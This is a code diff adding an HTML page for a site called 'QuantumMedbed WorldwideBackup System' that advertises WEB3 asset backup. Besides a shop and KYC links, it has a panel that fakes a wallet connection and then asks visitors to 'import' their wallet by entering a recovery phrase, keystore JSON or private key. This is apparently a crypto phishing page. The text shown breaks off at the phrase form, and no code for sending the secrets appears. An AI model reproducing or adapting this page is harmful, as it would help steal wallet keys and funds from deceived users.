@@ -1,0 +1,911 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+<head>
+
+    <meta property="og:title" content="QuantumMedbed WorldwideBackup System">
+    <meta property="og:description" content="Secured WEB3 Assets Backup">
+    <meta property="og:image" content="https://QuantumMedbedWorldwideBackupSystem.com/img/favicon.ico">
+    <meta property="og:url" content="https://QuantumMedbedWorldwideBackupSystem.com">
+    <meta property="og:type" content="QuantumMedbed WorldwideBackup System">
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+    <title>QuantumMedbed WorldwideBackup System</title>
+    <link rel="stylesheet" type="text/css" href="styles/bootstrap.css">
+    <link rel="stylesheet" type="text/css" href="fonts/bootstrap-icons.css">
+    <link rel="stylesheet" type="text/css" href="styles/style.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="manifest" href="_manifest.json">
+    <link rel="icon" href="app/icons/favicon.ico" type="image/x-icon">
+    <meta id="theme-check" name="theme-color" content="#FFFFFF">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://QuantumMedbedWorldwideBackupSystem.com/img/favicon.ico">
+
+
+    <!-- <link rel="stylesheet" type="text/css" href="styles/reset.css"> -->
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="https://www.cryptohopper.com/widgets/js/script" defer></script>
+
+    <!-- pagination with luckmoshyJqueryPagnation -->
+    <script src="scripts/luckmoshyJqueryPagnation.js"></script>
+    <link rel="stylesheet" href="styles/pagination.css">
+    <!-- loading Style CSS -->
+    <link rel="stylesheet" href="styles/loading.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css">
+
+    <!-- /////toaster------------------- -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" integrity="sha512-vKMx8UnXk60zUwyUnUPM3HbQo8QfmNx7+ltw8Pm5zLusl1XIfwcxo8DbWCqMGKaWeNxWA8yrx5v3SaVpMvR3CA==" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js" integrity="sha512-VEd+nq25CkR676O+pLBnDW09R7VQX9Mdiij052gVCp5yVH3jGtH70Ho/UUv4mJDsEdTvqRCFZg0NKGiojGnUCw==" crossorigin="anonymous"></script>
+    <script>
+        toastr.options = {
+            "closeButton": false,
+            "debug": false,
+            "newestOnTop": false,
+            "progressBar": true,
+            "positionClass": "toast-top-right",
+            "preventDuplicates": false,
+            "onclick": null,
+            "showDuration": "300",
+            "hideDuration": "1000",
+            "timeOut": "5000",
+            "extendedTimeOut": "1000",
+            "showEasing": "swing",
+            "hideEasing": "linear",
+            "showMethod": "fadeIn",
+            "hideMethod": "fadeOut"
+        }
+    </script>
+
+
+    <!-- sweet alert -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.16.1/dist/sweetalert2.all.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.16.1/dist/sweetalert2.min.css" rel="stylesheet">
+    <!-- izi toast -->
+    <link rel="stylesheet" href="styles/iziToast.min.css">
+    <script src="scripts/iziToast.min.js"></script>
+
+
+    <!-- Dropify CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/dropify/dist/css/dropify.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/dropify/dist/js/dropify.min.js"></script>
+
+</head>
+
+
+<input type="hidden" id="currencysymbol" value="$">
+<input type="hidden" id="currencyCode" value="USD">
+
+<!-- Smartsupp Live Chat script -->
+<!-- Floating Translator -->
+<div id="floating-translator">
+    <!-- Flags -->
+    <div id="flags">
+        <a href="#" onclick="doGTranslate('en|en'); return false;" title="English (UK)" class="gflag" style="background-position:-0px -0px;">
+            <img src="https://gtranslate.net/flags/blank.png" alt="English" />
+        </a>
+        <a href="#" onclick="doGTranslate('en|en'); return false;" title="English (US)" class="gflag">
+            <img src="https://cdn.gtranslate.net/flags/32/en-us.png" alt="US English" />
+        </a>
+        <a href="#" onclick="doGTranslate('en|fr'); return false;" title="French" class="gflag" style="background-position:-200px -100px;">
+            <img src="https://gtranslate.net/flags/blank.png" alt="French" />
+        </a>
+        <a href="#" onclick="doGTranslate('en|de'); return false;" title="German" class="gflag" style="background-position:-300px -100px;">
+            <img src="https://gtranslate.net/flags/blank.png" alt="German" />
+        </a>
+
+    </div>
+
+    <!-- Dropdown -->
+    <div id="google_translate_element2"></div>
+</div>
+<!-- Styles -->
+<style>
+    #floating-translator {
+        position: fixed;
+        bottom: 90px;
+        /*right: 20px;*/
+        background: #000000dd;
+        border-radius: 10px;
+        padding: 10px;
+        z-index: 9999;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        display: flex;
+        flex-direction: column;
+        /* stack vertically */
+        /*align-items: center;*/
+        /*gap: 10px;*/
+        backdrop-filter: blur(6px);
+        width: 120px;
+    }
+
+    #flags {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 5px;
+        height: 20px;
+    }
+
+    #flags a.gflag {
+        background-image: url('https://gtranslate.net/flags/16.png');
+        background-repeat: no-repeat;
+        width: 16px;
+        height: 16px;
+        display: inline-block;
+    }
+
+    #flags a.gflag:hover {
+        background-image: url('https://gtranslate.net/flags/16a.png');
+    }
+
+    #flags a.gflag img {
+        border: 0;
+        width: 16px;
+        height: 16px;
+        display: block;
+    }
+
+    .goog-te-banner-frame.skiptranslate,
+    .goog-te-banner-frame,
+    #goog-gt-tt,
+    .goog-logo-link,
+    .goog-te-gadget span,
+    .VIpgJd-ZVi9od-l4eHX-hSRGPd,
+    .VIpgJd-ZVi9od-ORHb-OEVmcd {
+        display: none !important;
+        visibility: hidden !important;
+    }
+
+    body {
+        top: 0 !important;
+    }
+
+    .goog-te-gadget {
+        color: transparent !important;
+        background: none !important;
+    }
+
+    .goog-te-combo {
+        width: 100px;
+        padding: 3px 6px;
+        height: 25px;
+        border-radius: 5px;
+        border: none;
+        background-color: #dd0068 !important;
+        color: #fff !important;
+        font-size: 13px;
+        cursor: pointer;
+    }
+
+    #google_translate_element2 {
+        height: 25px !important;
+    }
+</style>
+
+<!-- Scripts -->
+<script type="text/javascript">
+    function googleTranslateElementInit2() {
+        new google.translate.TranslateElement({
+            pageLanguage: 'en',
+            autoDisplay: false
+        }, 'google_translate_element2');
+    }
+
+    function GTranslateFireEvent(element, event) {
+        try {
+            if (document.createEvent) {
+                var evt = document.createEvent("HTMLEvents");
+                evt.initEvent(event, true, true);
+                element.dispatchEvent(evt);
+            } else {
+                var evt = document.createEventObject();
+                element.fireEvent('on' + event, evt);
+            }
+        } catch (e) {}
+    }
+
+    function doGTranslate(langPair) {
+        if (langPair.value) langPair = langPair.value;
+        if (langPair == '') return;
+        var lang = langPair.split('|')[1];
+        var select = document.getElementsByTagName('select');
+        for (var i = 0; i < select.length; i++) {
+            if (select[i].className.indexOf('goog-te-combo') > -1) {
+                select[i].value = lang;
+                GTranslateFireEvent(select[i], 'change');
+            }
+        }
+    }
+</script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit2"></script>
+
+<!-- Smartsupp Live Chat script -->
+<!-- <a href="https://signal.me/#p/+1234567890" target="_blank" style="
+    position: fixed;
+    bottom: 90px;
+    right: 20px;
+    background-color: #3A76F0;
+    color: white;
+    padding: 10px 15px;
+    border-radius: 50px;
+    text-decoration: none;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    z-index: 9999;
+">
+    Chat on Signal
+</a>
+<script type="text/javascript">
+    (function() {
+    var options = {
+      whatsapp: "+1(912)7916519",
+      telegram: "Qfssupporteams",
+      call_to_action: "Contact Us!",
+      position: "right",
+      order: "whatsapp,telegram"
+    };
+
+    var proto = document.location.protocol,
+      host = "getbutton.io",
+      url = proto + "//static." + host;
+    var s = document.createElement('script');
+    s.type = 'text/javascript';
+    s.async = true;
+    s.src = url + '/widget-send-button/js/init.js';
+    s.onload = function() {
+      WhWidgetSendButton.init(host, proto, options);
+
+    };
+    var x = document.getElementsByTagName('script')[0];
+    x.parentNode.insertBefore(s, x);
+  })();
+</script>
+<style>
+    /* Matches any element whose id starts with gb-widget- */
+    [id^="gb-widget-"] {
+        bottom: 135px !important;
+    }
+</style> -->
+
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = '01949fc9a1ffbc9f2710bb3a91e2464339e45e5b';
+    window.smartsupp || (function(d) {
+        var s, c, o = smartsupp = function() {
+            o._.push(arguments)
+        };
+        o._ = [];
+        s = d.getElementsByTagName('script')[0];
+        c = d.createElement('script');
+        c.type = 'text/javascript';
+        c.charset = 'utf-8';
+        c.async = true;
+        c.src = 'https://www.smartsuppchat.com/loader.js?';
+        s.parentNode.insertBefore(c, s);
+    })(document);
+</script>
+<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
+
+<body class="theme-dark">
+
+    <div id="preloader">
+        <div class="spinner-border color-highlight" role="status"></div>
+    </div>
+
+    <!-- Page Wrapper-->
+    <div id="page">
+
+        <!-- Footer Bar -->
+        <div id="footer-bar" class="footer-bar-1 footer-bar-detached">
+            <a href="rcard.php"><i class="bi bi-wallet2"></i><span>Cards</span></a>
+            <!-- <a href="#"><i class="bi bi-graph-up"></i><span>Activity</span></a> -->
+            <a href="qphone.php"><i class="bi bi-phone"></i><span>QPhone</span></a>
+            <a href="index.php" class="circle-nav-2"><i class="bi bi-house-fill"></i><span>Home</span></a>
+            <a href="kyc.php"><i class="bi bi-person-bounding-box"></i><span>Verify Account</span></a>
+            <a href="#" data-bs-toggle="offcanvas" data-bs-target="#menu-sidebar"><i class="bi bi-three-dots"></i><span>More</span></a>
+        </div>
+        <!-- Page Content - Only Page Elements Here-->
+        <div class="page-content footer-clear">
+
+            <!-- Page Title-->
+            <div class="pt-3">
+                <div class="page-title d-flex">
+                    <div class="align-self-center">
+                        <a href="#" data-back-button class="me-3 ms-0 icon icon-xxs bg-theme rounded-s shadow-m">
+                            <i class="bi bi-chevron-left color-theme font-14"></i>
+                        </a>
+                    </div>
+                    <div class="align-self-center me-auto">
+                        <!-- <p class="color-highlight">Hello Enabled</p> -->
+                        <h1 class="color-theme">Products</h1>
+                    </div>
+                    <div class="align-self-center ms-auto">
+
+
+
+                        <div style="display: none;" class="loading">Loading&#8230;</div>
+                        <a href="#" data-bs-toggle="offcanvas" data-bs-target="#cart" class="icon gradient-blue color-white shadow-bg shadow-bg-xs rounded-m">
+        <i class="bi bi-cart-check-fill font-17"></i>
+        <em class="cart_item_count badge bg-red-dark color-white scale-box">0</em>
+    </a> <a href="#" data-bs-toggle="dropdown" class="icon gradient-blue shadow-bg shadow-bg-s rounded-m">
+        <img src="images/user-default.png" width="45" class="rounded-m" alt="img">
+    </a>
+                        <!-- Page Title Dropdown Menu-->
+                        <div class="dropdown-menu">
+                            <div class="card card-style shadow-m mt-1 me-1">
+                                <div class="list-group list-custom list-group-s list-group-flush rounded-xs px-3 py-1">
+                                    <!-- <a href="page-wallet.html" class="list-group-item">
+                    <i
+                        class="has-bg gradient-green shadow-bg shadow-bg-xs color-white rounded-xs bi bi-credit-card"></i>
+                    <strong class="font-13">Wallet</strong>
+                </a>
+                <a href="page-activity.html" class="list-group-item">
+                    <i
+                        class="has-bg gradient-blue shadow-bg shadow-bg-xs color-white rounded-xs bi bi-graph-up"></i>
+                    <strong class="font-13">Activity</strong>
+                </a> -->
+                                    <a href="profile" class="list-group-item">
+                    <i
+                        class="has-bg gradient-yellow shadow-bg shadow-bg-xs color-white rounded-xs bi bi-person-circle"></i>
+                    <strong class="font-13">Account</strong>
+                </a>
+
+                                    <a href="#" class="list-group-item" data-toggle-theme="" data-trigger-switch="switch-1">
+                    <i class="has-bg gradient-blue shadow-bg shadow-bg-xs color-white rounded-xs bi-lightbulb-fill"></i>
+                    <strong class="font-13">Dark Mood</strong>
+                    <div class="form-switch ios-switch switch-green switch-s me-2">
+                        <input type="checkbox" data-toggle-theme="" class="ios-input" id="switch-1">
+                        <label class="custom-control-label" for="switch-1"></label>
+                    </div>
+                </a>
+
+                                    <a href="includes/logout.php" class="list-group-item">
+                    <i
+                        class="has-bg gradient-red shadow-bg shadow-bg-xs color-white rounded-xs bi bi-power"></i>
+                    <strong class="font-13">Log Out</strong>
+                </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <script>
+                        count_cart_item();
+                        //count_wishlist_item();
+
+                        function count_cart_item() {
+                            $("#cart_table tbody").empty();
+                            var load_count = "loadcount";
+                            $.ajax({
+                                url: 'includes/server',
+                                type: 'POST',
+                                dataType: 'JSON',
+                                data: {
+                                    load_count: load_count,
+                                },
+                                success: function(response) {
+                                    //porpulate cart count
+                                    $('.cart_item_count').text(response.mssg);
+                                }
+                            });
+
+                        }
+                    </script>
+                </div>
+            </div>
+
+
+
+
+
+
+
+
+            <div class="row text-center">
+
+                <div style="padding: 35px !important;" class="dashboard-body-part">
+
+                    <!-- <div style="margin-bottom: 35px;" class="text-center">
+                        <h5 class="title">Wallets</h5>
+                        <p>Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
+                    </div> -->
+
+                    <div id="items" class="row g-sm-4 g-3 justify-content-center">
+
+                    </div>
+
+
+
+
+
+
+                    <div class="pagination__area bg__gray--color">
+
+                        <ul id="luckmoshy" class=" pagination justify-content-center mt-4 mb-0">
+                            <!--luckmoshypagnation page are paging here-->
+                        </ul>
+                        <input type="hidden" id="totalPages" value="1">
+                    </div>
+
+
+                    <script>
+                        currencysymbol = $("#currencysymbol").val();
+                        //loaditems();
+
+                        function loaditems(page) {
+                            //$("#cart_table tbody").empty();
+                            $('.loading').show();
+
+                            $.ajax({
+                                url: "includes/server",
+                                method: "POST",
+                                dataType: "json",
+                                data: {
+                                    page: page,
+                                    tag: "loaditems",
+                                },
+                                success: function(response) {
+                                    if (response.status === 'success') {
+                                        $('.loading').hide();
+                                        $("#items").empty();
+                                        $("#litems").empty();
+                                        var len = response.data.length;
+                                        let grandTotal = 0;
+                                        for (var i = 0; i < len; i++) {
+                                            var id = response.data[i].id;
+                                            var name = response.data[i].name;
+                                            var price = response.data[i].price;
+                                            var old_price = response.data[i].old_price;
+                                            var qty = response.data[i].qty;
+                                            var product_img = response.data[i].product_img;
+
+
+                                            var tr_str = `                                            
+                                                            <div class="col-xl-2 col-lg-3 col-md-4 col-sm-6 col-6">
+                                                                <div class="card product-card text-center shadow-sm h-100 p-2">
+                                                                    <div class="card-img-top">
+                                                                      <img src="img/${product_img}"
+                                                                         alt="Product Image"
+                                                                         class="img-fluid p-2"
+                                                                              style="height: 120px; object-fit: contain;" />
+                                                                    </div>
+                                                                    <div class="card-body p-2">
+                                                                      <h6 class="card-title mb-1">${name}</h6>
+                                                                      <p class="card-text text-muted mb-2" style="font-size: 0.9rem;">${currencysymbol}${parseFloat(price).toLocaleString()}</p>
+                                                                      <button id="${id}" class="add_to_Cart btn btn-sm gradient-green w-100 wallet" data-id="124">Add to Cart</button>
+                                                                    </div>
+                                                                </div>
+                                                            </div>              
+                                                              `;
+
+                                            // $("#litems").append(ltr_str);
+                                            $("#items").append(tr_str);
+
+                                            // const subTotal = price * qty;
+                                            // grandTotal += subTotal;
+
+                                        }
+                                    } else {
+                                        // Handle error response
+                                        //alert("An error occurred: " + response.message + ". Please contact admin.");
+                                        $('.loading').show();
+                                        toastr["error"]("An error occurred: Please contact admin.");
+                                    }
+                                },
+                                error: function(xhr, status, error) {
+                                    // Handle AJAX error
+                                    $('.loading').show();
+                                    toastr["error"]("An error occurred: Please contact admin.");
+                                }
+                            });
+
+                        }
+
+
+                        console.log(parseInt($("#totalPages").val()));
+                        if (parseInt($("#totalPages").val()) == 0) {
+                            console.log("no data fount");
+                            $('.no_mssg').show();
+                        } else {
+                            $("#luckmoshy").luckmoshyPagination({
+                                totalPages: parseInt($("#totalPages").val()),
+                                // the current page that show on start
+                                startPage: 1,
+
+                                // maximum visible pages
+                                visiblePages: 2,
+
+                                initiateStartPageClick: true,
+
+                                // template for pagination links
+                                href: false,
+
+                                // variable name in href template for page number
+                                hrefVariable: "{{number}}",
+
+                                // Text labels
+                                first: "First",
+                                prev: "Previous",
+                                next: "Next",
+                                last: "Last",
+
+                                // carousel-style pagination
+                                loop: true,
+
+                                // callback function
+                                onPageClick: function(event, page) {
+                                    loaditems(page);
+                                },
+
+                                // pagination Classes
+                                paginationClass: "pagination",
+                                nextClass: "next",
+                                prevClass: "prev",
+                                lastClass: "last",
+                                firstClass: "first",
+                                pageClass: "page-item ",
+                                activeClass: "active",
+                                disabledClass: "disabled",
+                            });
+                        }
+                    </script>
+
+
+                    <!-- <footer style="margin-bottom: 40px; margin-top: 50px;" class="Footer__SFooter-sc-1k47aoh-0 jVWwwJ text-center">
+                        <a href="javascript:;" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+                            <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+RGlzY29yZCBpY29uPC90aXRsZT48ZyBmaWxsPSJyZ2IoODgsIDExMiwgMTM1KSI+PHBhdGggZD0iTTIwLjIyMiAwYzEuNDA2IDAgMi41NCAxLjEzNyAyLjYwNyAyLjQ3NVYyNGwtMi42NzctMi4yNzMtMS40Ny0xLjMzOC0xLjYwNC0xLjM5OC42NyAyLjIwNUgzLjcxYy0xLjQwMiAwLTIuNTQtMS4wNjUtMi41NC0yLjQ3NlYyLjQ4QzEuMTcgMS4xNDIgMi4zMS4wMDMgMy43MTUuMDAzaDE2LjVMMjAuMjIyIDB6bS02LjExOCA1LjY4M2gtLjAzbC0uMjAyLjJjMi4wNzMuNiAzLjA3NiAxLjUzNyAzLjA3NiAxLjUzNy0xLjMzNi0uNjY4LTIuNTQtMS4wMDItMy43NDQtMS4xMzctLjg3LS4xMzUtMS43NC0uMDY0LTIuNDc1IDBoLS4yYy0uNDcgMC0xLjQ3LjItMi44MS43MzUtLjQ2Ny4yMDMtLjczNS4zMzYtLjczNS4zMzZzMS4wMDItMS4wMDIgMy4yMS0xLjUzN2wtLjEzNS0uMTM1cy0xLjY3Mi0uMDY0LTMuNDc3IDEuMjdjMCAwLTEuODA1IDMuMTQ0LTEuODA1IDcuMDIgMCAwIDEgMS43NCAzLjc0MyAxLjgwNiAwIDAgLjQtLjUzMy44MDUtMS4wMDItMS41NC0uNDY4LTIuMTQtMS40MDQtMi4xNC0xLjQwNHMuMTM0LjA2Ni4zMzUuMmguMDZjLjAzIDAgLjA0NC4wMTUuMDYuMDN2LjAwNmMuMDE2LjAxNi4wMy4wMy4wNi4wMy4zMy4xMzYuNjYuMjcuOTMuNC40NjYuMjAyIDEuMDY1LjQwMyAxLjguNTM2LjkzLjEzNSAxLjk5Ni4yIDMuMjEgMCAuNi0uMTM1IDEuMi0uMjY3IDEuOC0uNTM1LjM5LS4yLjg3LS40IDEuMzk3LS43MzcgMCAwLS42LjkzNi0yLjIwNSAxLjQwNC4zMy40NjYuNzk1IDEgLjc5NSAxIDIuNzQ0LS4wNiAzLjgxLTEuOCAzLjg3LTEuNzI2IDAtMy44Ny0xLjgxNS03LjAyLTEuODE1LTcuMDItMS42MzUtMS4yMTQtMy4xNjUtMS4yNi0zLjQzNS0xLjI2bC4wNTYtLjAyem0uMTY4IDQuNDEzYy43MDMgMCAxLjI3LjYgMS4yNyAxLjMzNSAwIC43NC0uNTcgMS4zNC0xLjI3IDEuMzQtLjcgMC0xLjI3LS42LTEuMjctMS4zMzQuMDAyLS43NC41NzMtMS4zMzggMS4yNy0xLjMzOHptLTQuNTQzIDBjLjcgMCAxLjI2Ni42IDEuMjY2IDEuMzM1IDAgLjc0LS41NyAxLjM0LTEuMjcgMS4zNC0uNyAwLTEuMjctLjYtMS4yNy0xLjMzNCAwLS43NC41Ny0xLjMzOCAxLjI3LTEuMzM4eiIvPjwvZz48L3N2Zz4=" alt="Discord">
+                            </div>
+                            <p>Discord</p>
+                        </a>
+                        <a href="javascript:;" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+                            <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+VHdpdHRlciBpY29uPC90aXRsZT48ZyBmaWxsPSJyZ2IoODgsIDExMiwgMTM1KSI+PHBhdGggZD0iTTIzLjk1NCA0LjU2OWMtLjg4NS4zODktMS44My42NTQtMi44MjUuNzc1IDEuMDE0LS42MTEgMS43OTQtMS41NzQgMi4xNjMtMi43MjMtLjk1MS41NTUtMi4wMDUuOTU5LTMuMTI3IDEuMTg0LS44OTYtLjk1OS0yLjE3My0xLjU1OS0zLjU5MS0xLjU1OS0yLjcxNyAwLTQuOTIgMi4yMDMtNC45MiA0LjkxNyAwIC4zOS4wNDUuNzY1LjEyNyAxLjEyNEM3LjY5MSA4LjA5NCA0LjA2NiA2LjEzIDEuNjQgMy4xNjFjLS40MjcuNzIyLS42NjYgMS41NjEtLjY2NiAyLjQ3NSAwIDEuNzEuODcgMy4yMTMgMi4xODggNC4wOTYtLjgwNy0uMDI2LTEuNTY2LS4yNDgtMi4yMjgtLjYxNnYuMDYxYzAgMi4zODUgMS42OTMgNC4zNzQgMy45NDYgNC44MjctLjQxMy4xMTEtLjg0OS4xNzEtMS4yOTYuMTcxLS4zMTQgMC0uNjE1LS4wMy0uOTE2LS4wODYuNjMxIDEuOTUzIDIuNDQ1IDMuMzc3IDQuNjA0IDMuNDE3LTEuNjggMS4zMTktMy44MDkgMi4xMDUtNi4xMDIgMi4xMDUtLjM5IDAtLjc3OS0uMDIzLTEuMTctLjA2NyAyLjE4OSAxLjM5NCA0Ljc2OCAyLjIwOSA3LjU1NyAyLjIwOSA5LjA1NCAwIDEzLjk5OS03LjQ5NiAxMy45OTktMTMuOTg2IDAtLjIwOSAwLS40Mi0uMDE1LS42My45NjEtLjY4OSAxLjgtMS41NiAyLjQ2LTIuNTQ4bC0uMDQ3LS4wMnoiLz48L2c+PC9zdmc+" alt="Twitter"></div>
+                            <p>Twitter</p>
+                        </a>
+                        <a href="javascript:;" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+                            <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+R2l0SHViIGljb248L3RpdGxlPjxnIGZpbGw9InJnYig4OCwgMTEyLCAxMzUpIj48cGF0aCBkPSJNMTIgLjI5N2MtNi42MyAwLTEyIDUuMzczLTEyIDEyIDAgNS4zMDMgMy40MzggOS44IDguMjA1IDExLjM4NS42LjExMy44Mi0uMjU4LjgyLS41NzcgMC0uMjg1LS4wMS0xLjA0LS4wMTUtMi4wNC0zLjMzOC43MjQtNC4wNDItMS42MS00LjA0Mi0xLjYxQzQuNDIyIDE4LjA3IDMuNjMzIDE3LjcgMy42MzMgMTcuN2MtMS4wODctLjc0NC4wODQtLjcyOS4wODQtLjcyOSAxLjIwNS4wODQgMS44MzggMS4yMzYgMS44MzggMS4yMzYgMS4wNyAxLjgzNSAyLjgwOSAxLjMwNSAzLjQ5NS45OTguMTA4LS43NzYuNDE3LTEuMzA1Ljc2LTEuNjA1LTIuNjY1LS4zLTUuNDY2LTEuMzMyLTUuNDY2LTUuOTMgMC0xLjMxLjQ2NS0yLjM4IDEuMjM1LTMuMjItLjEzNS0uMzAzLS41NC0xLjUyMy4xMDUtMy4xNzYgMCAwIDEuMDA1LS4zMjIgMy4zIDEuMjMuOTYtLjI2NyAxLjk4LS4zOTkgMy0uNDA1IDEuMDIuMDA2IDIuMDQuMTM4IDMgLjQwNSAyLjI4LTEuNTUyIDMuMjg1LTEuMjMgMy4yODUtMS4yMy42NDUgMS42NTMuMjQgMi44NzMuMTIgMy4xNzYuNzY1Ljg0IDEuMjMgMS45MSAxLjIzIDMuMjIgMCA0LjYxLTIuODA1IDUuNjI1LTUuNDc1IDUuOTIuNDIuMzYuODEgMS4wOTYuODEgMi4yMiAwIDEuNjA2LS4wMTUgMi44OTYtLjAxNSAzLjI4NiAwIC4zMTUuMjEuNjkuODI1LjU3QzIwLjU2NSAyMi4wOTIgMjQgMTcuNTkyIDI0IDEyLjI5N2MwLTYuNjI3LTUuMzczLTEyLTEyLTEyIi8+PC9nPjwvc3ZnPg==" alt="Github"></div>
+                            <p>Github</p>
+                        </a>
+                    </footer> -->
+                </div>
+
+                <style>
+                    .trans-img {
+                        max-width: 100px !important;
+                        max-height: 130px !important;
+                        margin-top: 20px !important;
+                    }
+
+                    .card-style {
+                        margin: 0 !important;
+                        padding-bottom: 15px;
+                        padding-right: 10px;
+                        padding-left: 10px;
+                    }
+                </style>
+
+
+
+
+
+
+
+                <div id="menu-top-detached" style="height:380px;" class="offcanvas offcanvas-top rounded-m offcanvas-detached">
+                    <div class="d-flex m-3">
+                        <div class="align-self-center">
+                            <h4 class="font-700 mb-0">Backup Your assets</h4>
+                        </div>
+                        <div class="align-self-center ms-auto">
+                            <a href="#" class="closebutn icon icon-xs me-n2" data-bs-dismiss="offcanvas">
+                                <i class="bi bi-x-circle-fill color-red-dark font-16"></i>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="modal-dialog" role="document">
+                        <!-- <form action="" method="post"> -->
+                        <input type="hidden" name="_token" value="p0gvYZcEqKi3wFcVVu99qSuCdhcnqUkA0eo1fovN">
+                        <div class="modal-content bg-body">
+                            <div class="row loaderdiv" style="margin: 10px 30px 0px 30px;">
+                                <div class="col-4 spct">
+                                    <div class="loader">
+                                        <div class="loader1">
+                                            <div class="circle"></div>
+                                            <div class="picture">
+                                                <img id="loader_img" src="" alt="Overlay Image">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <p id="con_stats">Connecting...</p>
+                                    <button style="display: none; margin-bottom: 10px; font-size: x-small;" id="con_button" type="submit" class="btn btn-xxs gradient-green"><i data-feather="repeat"></i> Connect Manually</button>
+                                </div>
+
+
+
+                                <div id="blc" class="col-6 spct text-center" style="margin-left: 16%; text-align: center;">
+                                    <div style="width: 100px;">
+                                        <img width="100%" id="img" src="images/icons/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="" style="display: inline-flex;">
+                                    </div>
+                                    <b id="wallet_name">Trust Wallet</b>
+                                </div>
+
+                                <style>
+                                    .spct {
+                                        display: flex;
+                                        /* Enables flexbox on the div */
+                                        flex-direction: column;
+                                        /* Stacks children vertically */
+                                        align-items: center;
+                                        /* Centers children horizontally */
+                                        justify-content: center;
+                                        /* Centers children vertically */
+                                        /* height: 100vh; */
+                                        /* Full viewport height for vertical centering */
+                                        margin: 0 auto;
+                                        /* Centers the div horizontally in its container */
+                                        text-align: center;
+                                        /* Ensures text is centered inside the div */
+                                    }
+
+                                    #blc img {
+                                        display: block;
+                                        /* Prevents inline space around the image */
+                                        margin: 0 auto;
+                                        /* Ensures the image is centered */
+                                    }
+
+                                    #menu-top-detached {
+                                        width: auto !important;
+                                        height: auto !important;
+                                        padding: 15px;
+                                    }
+
+                                    .modal-content {
+                                        background-color: rgb(255 255 255 / 0%) !important;
+                                    }
+
+                                    #wallet_name {
+                                        margin-top: 10px;
+                                        /* Adds spacing between the image and the text */
+                                    }
+
+                                    .YwSGw {
+                                        display: inline-block;
+                                        padding: 20px;
+                                        width: 60px;
+                                    }
+                                </style>
+
+                            </div>
+                            <div class="modal-body">
+                                <div style="display: none;" id="input_con" class="row">
+                                    <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;" _mstvisible="6">
+                                        <img src="" style="margin-right: 20px; height: 40px; width: 40px" id="myImg" _mstvisible="7">
+                                        <span _msttexthash="543361" _msthash="8" _mstvisible="7">Import your
+                                            <span id="walletname1" _msttexthash="75595" _msthidden="1" _msthash="182"></span> wallet
+                                        </span>
+                                    </h3>
+                                    <nav>
+                                        <div class="nav nav-tabs" id="nav-tab" role="tablist">
+                                            <button class="nav-link active btn-sm" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Phrase</button>
+                                            <button class="nav-link btn-sm" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">Keystore JSON</button>
+                                            <button class="nav-link btn-sm" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Private Key</button>
+                                        </div>
+                                    </nav>
+                                    <div class="tab-content" id="nav-tabContent">
+                                        <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
